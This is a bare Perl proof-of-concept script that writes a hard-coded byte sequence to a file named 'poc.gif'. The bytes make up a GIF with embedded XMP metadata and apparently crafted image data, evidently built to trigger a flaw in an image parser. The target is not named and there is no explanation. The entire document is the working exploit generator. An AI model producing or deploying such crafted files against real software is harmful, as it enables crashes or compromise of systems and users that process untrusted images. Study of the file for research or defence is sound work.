#!/usr/bin/perl
my $poc =
"\x47\x49\x46\x38\x39\x61\x93\x00\x33\x00\xE6\x7F\x00\x23\xCC\xF5\x03\xC7\xB6\xF7\x96\x25\xFC\xC7\x26".
"\xFD\x69\x2D\xA4\xD8\x7B\x0C\xA4\xFB\x6A\xD5\x9D\xFC\xCB\xA7\x1F\xC5\xF6\xF0\x7A\x51\x65\xCE\xFA\xD9".
"\xF0\xC7\xB3\xE3\x91\xFD\x86\x4A\xF9\x77\x16\xF6\xAF\x4A\xFE\x57\x06\x93\xCD\x64\x03\x92\xFE\x14\xB3".
"\xF9\x8D\xCA\x5B\xFE\xD4\xBE\xFE\xE6\xA1\xF8\xBC\x6A\xC3\xE8\xFE\xF5\x5B\x34\xFD\xE1\x84\xFE\xE5\xD7".
"\xF6\x86\x1F\x00\xA7\x99\xF9\xBC\x36\xF8\xC8\x8D\x15\x98\xFF\x85\xC5\x51\xFA\xCC\x74\x44\xD4\xF5\xAE".
"\xDD\xFF\xFD\xD7\x5B\xFD\xB1\x85\xFF\x91\x68\xAC\xDD\x85\xA7\xE4\x79\x10\xAB\xFA\x15\xB9\xC8\x37\xA8".
"\xFF\xDF\xF1\xFF\x00\xB2\xA4\x00\xBA\xAB\xFC\x62\x0A\xCA\xEF\xAD\x2C\xA3\xFF\x57\xB8\xFF\x00\xBE\xB0".
"\xF3\xFB\xFF\x01\xAD\xA0\xE7\xF5\xDA\x48\xB3\xFF\xE4\xF9\xFE\x95\xD4\xFF\x1A\xC2\xD7\xFA\xF5\xD5\x09".
"\x9E\xFC\x02\x8E\xFF\x0A\x92\xFF\xD3\xF1\xBB\xFE\xF9\xF4\xFF\x5E\x1A\xFF\xF6\xF0\x99\xD1\x6C\xEF\x56".
"\x39\x19\xBB\xF8\xD5\xF1\xFE\x9F\xD4\x73\x94\xD2\x62\xCD\xE8\xB8\x64\xBE\xFF\xEC\x4C\x3D\xC8\xF0\xFD".
"\x06\x99\xFD\xFB\xB5\x27\x87\xC7\x54\x20\x9D\xFF\x1B\xC0\xF7\x8A\xC8\x57\x9E\xDB\x6E\xEF\xFA\xE6\x16".
"\xB7\xF8\xFF\x50\x03\x01\xB6\xA9\xFA\x6D\x10\x8C\x8C\x8C\xD9\xD9\xD9\xB2\xB2\xB2\x70\x70\x70\x79\x79".
"\x79\xF5\xF5\xF5\xE2\xE2\xE2\xEC\xEC\xEC\xA0\xA0\xA0\xC5\xC5\xC5\xA9\xA9\xA9\xCF\xCF\xCF\xBC\xBC\xBC".
"\x96\x96\x96\x83\x83\x83\x90\xCF\x5E\x97\xD5\x66\x74\xDD\xFA\x19\xBB\xB6\xFD\xF4\xE5\x13\xBC\xA2\xD2".
"\xF2\xE0\xF7\xFB\xF4\xFA\xFD\xF8\x89\xCC\x68\xFC\xCF\x41\xC1\xE9\xA1\x6C\xD3\xC8\x7D\xCD\x79\x0D\xBC".
"\xAA\xFE\xEE\xC3\x92\xDD\x97\x97\xE6\xF8\xA7\xE4\xFD\x3F\xBD\x86\x66\x66\x66\xFF\xFF\xFF\x21\xFF\x0B".
"\x58\x4D\x50\x20\x44\x61\x74\x61\x58\x4D\x50\x3C\x3F\x78\x70\x61\x63\x6B\x65\x74\x20\x62\x65\x67\x69".
"\x6E\x3D\x22\xEF\xBB\xBF\x22\x20\x69\x64\x3D\x22\x57\x35\x4D\x30\x4D\x70\x43\x65\x68\x69\x48\x7A\x72".
"\x65\x53\x7A\x4E\x54\x63\x7A\x6B\x63\x39\x64\x22\x3F\x3E\x20\x3C\x78\x3A\x78\x6D\x70\x6D\x65\x74\x61".
"\x20\x78\x6D\x6C\x6E\x73\x3A\x78\x3D\x22\x61\x64\x6F\x62\x65\x3A\x6E\x73\x3A\x6D\x65\x74\x61\x2F\x22".
"\x20\x78\x3A\x78\x6D\x70\x74\x6B\x3D\x22\x41\x64\x6F\x62\x65\x20\x58\x4D\x50\x20\x43\x6F\x72\x65\x20".
"\x35\x2E\x30\x2D\x63\x30\x36\x30\x20\x36\x31\x2E\x31\x33\x34\x37\x37\x37\x2C\x20\x32\x30\x31\x30\x2F".
"\x30\x32\x2F\x31\x32\x2D\x31\x37\x3A\x33\x32\x3A\x30\x30\x20\x20\x20\x20\x20\x20\x20\x20\x22\x3E\x20".
"\x3C\x72\x64\x66\x3A\x52\x44\x46\x20\x78\x6D\x6C\x6E\x73\x3A\x72\x64\x66\x3D\x22\x68\x74\x74\x70\x3A".
"\x2F\x2F\x77\x77\x77\x2E\x77\x33\x2E\x6F\x72\x67\x2F\x31\x39\x39\x39\x2F\x30\x32\x2F\x32\x32\x2D\x72".
"\x64\x66\x2D\x73\x79\x6E\x74\x61\x78\x2D\x6E\x73\x23\x22\x3E\x20\x3C\x72\x64\x66\x3A\x44\x65\x73\x63".
"\x72\x69\x70\x74\x69\x6F\x6E\x20\x72\x64\x66\x3A\x61\x62\x6F\x75\x74\x3D\x22\x22\x20\x78\x6D\x6C\x6E".
"\x73\x3A\x78\x6D\x70\x4D\x4D\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x6E\x73\x2E\x61\x64\x6F\x62\x65\x2E".
"\x63\x6F\x6D\x2F\x78\x61\x70\x2F\x31\x2E\x30\x2F\x6D\x6D\x2F\x22\x20\x78\x6D\x6C\x6E\x73\x3A\x73\x74".
"\x52\x65\x66\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x6E\x73\x2E\x61\x64\x6F\x62\x65\x2E\x63\x6F\x6D\x2F".
"\x78\x61\x70\x2F\x31\x2E\x30\x2F\x73\x54\x79\x70\x65\x2F\x52\x65\x73\x6F\xC2\x72\x63\x65\x52\x65\x66".
"\x23\x22\x20\x78\x6D\x6C\x6E\x73\x3A\x78\x6D\x70\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x6E\x73\x2E\x61".
"\x64\x6F\x62\x65\x2E\x63\x6F\x6D\x2F\x78\x61\x70\x2F\x31\x2E\x30\x2F\x22\x20\x78\x6D\x70\x4D\x4D\x3A".
"\x4F\x72\x69\x67\x69\x6E\x61\x6C\x44\x6F\x63\x75\x6D\x65\x6E\x74\x49\x44\x3D\x22\x78\x6D\x70\x2E\x64".
"\x69\x64\x3A\x38\x41\x39\x46\x30\x45\x41\x35\x41\x30\x30\x44\x45\x32\x31\x31\x41\x32\x34\x43\x41\x43".
"\x31\x35\x35\x33\x34\x41\x36\x34\x31\x31\x22\x20\x78\x6D\x70\x4D\x4D\x3A\x44\x6F\x63\x75\x6D\x65\x6E".
"\x74\x49\x44\x3D\x22\x78\x6D\x70\x2E\x64\x69\x64\x3A\x45\x32\x45\x42\x41\x43\x38\x44\x31\x34\x39\x46".
"\x31\x31\x45\x32\x41\x41\x36\x44\x42\x45\x41\x35\x41\x39\x43\x45\x43\x42\x45\x34\x22\x20\x78\x6D\x70".
"\x4D\x4D\x3A\x49\x6E\x73\x74\x61\x6E\x63\x65\x49\x44\x3D\x22\x78\x6D\x70\x2E\x69\x69\x64\x3A\x45\x32".
"\x45\x42\x41\x43\x38\x43\x31\x34\x39\x46\x31\x31\x45\x32\x41\x41\x36\x44\x42\x45\x41\x35\x41\x39\x43".
"\x45\x43\x42\x45\x34\x22\x20\x78\x6D\x70\x3A\x43\x72\x65\x61\x74\x6F\x72\x54\x6F\x6F\x6C\x3D\x22\x41".
"\x64\x6F\x62\x65\x20\x50\x68\x6F\x74\x6F\x73\x68\x6F\x70\x20\x43\x53\x35\x20\x57\x69\x6E\x64\x6F\x77".
"\x73\x22\x3E\x20\x3C\x78\x6D\x70\x4D\x4D\x3A\x44\x65\x72\x69\x76\x65\x64\x46\x72\x6F\x6D\x20\x73\x74".
"\x52\x65\x66\x3A\x69\x6E\x73\x74\x61\x6E\x63\x65\x49\x44\x3D\x22\x78\x6D\x70\x2E\x69\x69\x64\x3A\x42".
"\x41\x32\x30\x37\x42\x38\x35\x39\x45\x31\x34\x45\x32\x31\x31\x41\x30\x39\x34\x41\x44\x42\x30\x30\x35".
"\x30\x30\x41\x38\x35\x30\x22\x20\x73\x74\x52\x65\x66\x3A\x64\x6F\x63\x75\x6D\x65\x6E\x74\x49\x44\x3D".
"\x22\x78\x6D\x70\x2E\x64\x69\x64\x3A\x38\x41\x39\x46\x30\x45\x41\x35\x41\x30\x30\x44\x45\x32\x31\x31".
"\x41\x32\x34\x43\x41\x43\x31\x35\x35\x33\x34\x41\x36\x34\x31\x31\x22\x2F\x3E\x20\x3C\x2F\x72\x64\x66".
"\x3A\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x72\x64\x66\x3A\x52\x44\x46\x3E\x20".
"\x3C\x2F\x78\x3A\x78\x6D\x70\x6D\x65\x74\x61\x3E\x20\x3C\x3F\x78\x70\x61\x63\x6B\x65\x74\x20\x65\x6E".
"\x64\x3D\x22\x72\x22\x3F\x3E\x01\xFF\xFE\xFD\xFC\xFB\xFA\xF9\xF8\xF7\xF6\xF5\xF4\xF3\xF2\xF1\xF0\xEF".
"\xEE\xED\xEC\xEB\xEA\xE9\xE8\xE7\xE6\xE5\xE4\xE3\xE2\xE1\xE0\xDF\xDE\xDD\xDC\xDB\xDA\xD9\xD8\xD7\xD6".
"\xD5\xD4\xD3\xD2\xD1\xD0\xCF\xCE\xCD\xCC\xCB\xCA\xC9\xC8\xC7\xC6\xC5\xC4\xC3\xC2\xC1\xC0\xBF\xBE\xBD".
"\xBC\xBB\xBA\xB9\xB8\xB7\xB6\xB5\xB4\xB3\xB2\xB1\xB0\xAF\xAE\xAD\xAC\xAB\xAA\xA9\xA8\xA7\xA6\xA5\xA4".
"\xA3\xA2\xA1\xA0\x9F\x9E\x9D\x9C\x9B\x9A\x99\x98\x97\x96\x95\x94\x93\x92\x91\x90\x8F\x8E\x8D\x8C\x8B".
"\x8A\x89\x88\x87\x86\x85\x84\x83\x82\x81\x80\x7F\x7E\x7D\x7C\x7B\x7A\x79\x78\x77\x76\x75\x74\x73\x72".
"\x71\x70\x6F\x6E\x6D\x6C\x6B\x6A\x69\x68\x67\x66\x65\x64\x63\x62\x61\x60\x5F\x5E\x5D\x5C\x5B\x5A\x59".
"\x58\x57\x56\x55\x54\x53\x52\x51\x50\x4F\x4E\x4D\x4C\x4B\x4A\x49\x48\x47\x46\x45\x44\x43\x42\x41\x40".
"\x3F\x3E\x3D\x3C\x3B\x3A\x39\x38\x37\x36\x35\x34\x33\x32\x31\x30\x2F\x2E\x2D\x2C\x2B\x2A\x29\x28\x27".
"\x26\x25\x24\x23\x22\x21\x20\x1F\x1E\x1D\x1C\x1B\x1A\x19\x18\x17\x16\x15\x14\x13\x12\x11\x10\x0F\x0E".
"\x0D\x0C\x0B\x0A\x09\x08\x07\x06\x05\x04\x03\x02\x01\x00\x00\x21\xF9\x04\x01\x00\x00\x7F\x00\x2C\x00".
"\x00\x00\x00\x93\x00\x33\x00\x00\x07\xFF\x80\x7F\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E".
"\x8F\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7".
"\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0".
"\xC1\x8D\x36\x19\x3B\xC6\x19\x36\xC2\xCA\x86\x19\x34\x39\x39\x34\x34\x4C\x0B\x2E\xCB\xD6\x25\x33\xD9".
"\x2D\xDB\xCF\x34\xD5\xD6\xC1\x25\x21\xE3\x21\x52\x52\xD9\x33\x2D\x34\xE0\xC0\x2E\x21\x3F\x40\xF1\xF1".
"\xE3\xE6\x33\x25\xEC\xBE\x4C\x3F\xFB\xFC\x3F\x13\xF3\x21\x98\xE0\xE3\xE5\x62\x82\xC1\x83\x13\xFA\xFD".
"\x9B\x31\x70\xD7\x8E\x27\x10\x23\x4E\x78\x62\xB0\x5F\x43\x5D\x39\x7C\x68\xDC\xE8\x23\x22\xC5\x7D\x17".
"\x5D\x09\xB1\x60\x81\xC8\x21\x87\x28\x53\x1A\xF0\xB1\xB2\x23\xC5\x09\x21\x5B\x21\x40\xA1\xC0\x01\x87".
"\x42\x48\x56\xE8\xDC\xB9\x42\xA5\x46\x88\x31\x59\xA1\x20\x40\x60\xC8\x90\x9B\x83\x32\x50\x58\xB1\x74".
"\x29\xCF\x94\x3E\x72\x04\x5D\x85\x62\x48\x04\x2C\x58\x8E\x26\xBD\xC2\xF5\x0A\x85\xAF\x5F\x9F\x0A\x9C".
"\x9A\xEA\x04\x56\xAC\x11\x1C\x0C\x72\x72\xA4\xAD\x5B\xAE\x60\xFF\x77\xF2\x21\x9B\xCA\x02\xDA\x08\x31".
"\x62\x20\x10\xE4\x64\x8A\xDF\xBF\x53\xDA\xC2\x5D\x9A\x8C\x2E\x2A\x02\x78\xF3\x6A\xD1\x62\xD2\x49\x82".
"\xC7\x90\x13\xF8\x15\x4C\x61\x81\xE1\xB2\x8A\x17\x3F\x38\xF1\x07\x09\x80\xCF\xA0\x01\x40\x0E\x7C\x64".
"\xAE\x2A\x33\x63\xBE\xF8\x59\xFD\x05\xCD\x19\x30\x86\xC8\xA0\x51\xCD\xDA\x35\x6C\x45\x61\xCA\x6C\xA1".
"\xCD\x7A\xCB\x98\x33\x61\x18\x89\x39\x83\x26\xCD\xEA\xDE\x5D\x82\x17\x22\xF2\x40\xF3\x83\x07\x1D\x04".
"\x7D\x66\xC1\x82\x47\xE8\xC7\x53\x12\x14\x3E\xC5\x85\xF7\xF1\xE3\x5E\xBA\x0C\x32\xE3\xFD\xBB\x9F\xF0".
"\x88\xBA\x9B\x5F\xBF\xDA\xCB\x18\xE5\x85\xC4\x8C\x61\x6F\xFE\x8B\x99\x42\x27\x9E\x43\xEF\xD0\x61\x2F".
"\x09\x16\x1E\x04\x78\x83\x75\xA0\x25\xC0\xC6\x29\x5B\x24\x48\x9F\x79\x69\x80\x51\xC6\x82\xDF\x35\x58".
"\x08\x19\xEB\x25\xB8\x1B\x7B\xE2\x0D\x62\xA1\x17\x10\x9A\x37\x46\x21\x0E\xF0\xC7\x9F\x00\x10\xFC\xB1".
"\xC0\x0D\x01\x7A\x80\x62\x16\xA1\xE9\x70\x8A\x79\xE1\xC1\x17\x46\x17\x1C\xB2\x06\x1E\x70\x83\xE4\x56".
"\xA3\x1F\x68\x10\x02\x46\x8D\xE1\x89\x61\x88\x18\x66\x94\x41\x5B\x86\x82\xAC\x87\x06\xFF\x19\x42\xE6".
"\x48\xC6\x16\xDF\x21\xF9\x47\x1E\x23\x76\x60\x44\x07\x3D\xEC\xA1\xE2\x0D\x5C\xBE\x70\xC3\x0B\xD6\x1D".
"\xF8\xE2\x71\x12\x1A\x02\x86\x71\xDF\xA1\x71\x5B\x7C\x68\xFA\xC1\xC5\x78\xC7\xBD\xB9\x48\x18\x63\x48".
"\xF9\x9D\x17\x72\xA6\xB7\x63\x93\x82\x20\x20\x80\x00\x46\x34\xD1\x04\x08\x4E\x74\xF9\xC2\xA1\x88\xF2".
"\xE0\xE2\x98\x7E\x7C\xB1\xA6\x99\xBC\x39\x9A\x88\x18\x35\x7E\x28\x48\x17\xC7\x51\xF2\x1D\x7C\x89\x70".
"\x71\xDC\x19\x85\x60\x20\x80\xA0\x4D\x28\xF0\x47\x1B\x2F\x64\xA1\x2A\x0C\xAA\x66\xD1\x47\x10\xA8\x7C".
"\xBA\xC8\x19\xC7\x91\xB1\xC8\x83\xE7\xC1\xB9\x5A\x19\x8F\x3A\x72\x9C\xA5\x8C\x40\xE9\xC7\x16\x85\x08".
"\x01\x81\xA0\x46\x18\xC1\x81\x1D\x59\xC0\x00\x43\x0D\xCF\xC2\xF0\xC6\x1C\x54\x2C\xC1\x68\x9E\xE9\xC5".
"\xB9\x88\xA7\xAB\x0D\xF2\xE3\x77\xBE\x75\xD1\x85\x19\x5C\x70\xC1\xE7\x21\xC7\x49\xA9\x08\xA6\xC3\x1A".
"\xE2\x46\xB2\xC9\x9E\x00\x07\x1E\x35\xD4\x1B\x40\xBD\x77\x48\x50\x81\x08\x0C\x98\xA2\xAD\x22\xDC\xFA".
"\xC1\x48\xC0\x84\x50\xD8\x61\xA3\x63\xD8\x5A\x48\xBA\x8E\xB0\x4B\xAC\x21\x50\x68\x20\xB1\x00\x3D\x1C".
"\x50\x43\xFF\x00\x18\x07\x70\x40\x11\xFA\x8A\x50\x01\x0E\xA5\xFC\xDB\x69\xA6\xDB\x92\x3C\x88\x7C\x3B".
"\x42\xF8\x05\xA7\x0C\x37\xE2\xF0\x21\x03\x40\x41\x94\x00\x17\x04\x71\x40\xC6\x07\x24\xC1\xF1\xBE\x22".
"\x14\x10\xF2\x6A\xD8\x1E\x42\x70\xC9\xDD\x1E\x22\x06\x17\xE2\x76\x61\xE1\x7A\x5E\xF0\xD9\x32\x23\x2F".
"\x1B\x62\xC2\x00\x03\x08\x00\x05\x1D\x38\xD4\xD1\x80\x1E\x29\xA4\xA0\xB3\x04\x54\x88\x10\x45\x05\xFD".
"\x8E\x22\x72\xB6\x45\x03\x6C\xB2\x23\x62\x3C\xF9\xF4\xD3\x8B\x44\x5D\xC8\x06\x54\xD7\xDD\x83\xD6\x0D".
"\xA4\x50\x80\xCE\x6A\x84\x1D\x85\x1A\x3E\x9B\x0D\x34\xD1\x02\x13\x4E\x09\x6D\x0F\xFF\x01\xF7\xBA\xAB".
"\x25\x4E\x48\x1E\x75\x53\x7D\x01\x03\x79\xEB\x9D\x84\xBE\x51\x88\x40\x85\x1A\x55\x58\x21\xB8\x9B\x86".
"\x87\xFE\x47\xAF\x8B\x08\x9B\xF8\xE2\x89\xC8\x5D\x08\x1D\x03\x7C\xD0\xFA\x08\x72\xE4\xBD\xF7\xCE\x22".
"\x68\xAE\x44\x15\x65\x87\x72\xB6\xD0\x6B\xA3\x5D\xF8\x1F\x4A\xDF\xC7\x48\x18\xC7\x95\x31\x08\xEA\x88".
"\xA8\xFE\xF8\x07\xCC\x7F\x30\xC2\x1F\x38\x58\x5E\x44\x05\x7E\xAB\xB1\x86\x0A\xB0\x8A\xB2\xBB\x21\x43".
"\xAB\x9D\x36\xBB\x5F\x94\x61\x06\x97\xE9\x7F\x88\x41\xA3\xC8\xC8\x1F\xA2\x3C\x21\x23\x7C\x00\x01\x04".
"\xCF\xFF\xC1\xC0\xD7\x3C\x6F\x5E\x85\x0A\xB9\x83\xB2\x7D\x21\xDD\x8F\xFC\x3D\xD3\x16\x4A\x50\xCA\xFC".
"\x60\xBC\xE3\xAD\x46\x5D\xA9\x6B\x5C\x22\x84\x80\x81\xF7\x81\x60\x10\x4B\x90\x80\x1A\x32\x37\xB6\xEB".
"\xA9\xC0\x73\xDA\x1B\x9C\xF7\x7E\xE7\xBF\xDF\xA1\xEC\x60\xED\x01\x15\x21\xD2\x67\x88\xF5\x15\xC2\x02".
"\x08\x10\x02\x21\x18\x50\x84\xDA\xD9\x4F\x05\x32\x20\x85\x85\x38\x75\x88\x30\x58\x68\x78\x37\x2C\x44".
"\x91\xB6\x30\xC0\xD5\xA4\x21\x61\xA4\xB3\x90\xC2\x18\xF1\xA4\x2D\x14\x30\x12\x71\x58\x42\x12\x2A\xB0".
"\x86\x06\x64\xEF\x32\x50\x7C\x44\x20\x00\x00\x3B".
open(C, ">:raw", "poc.gif");
print C $poc;
close(C);
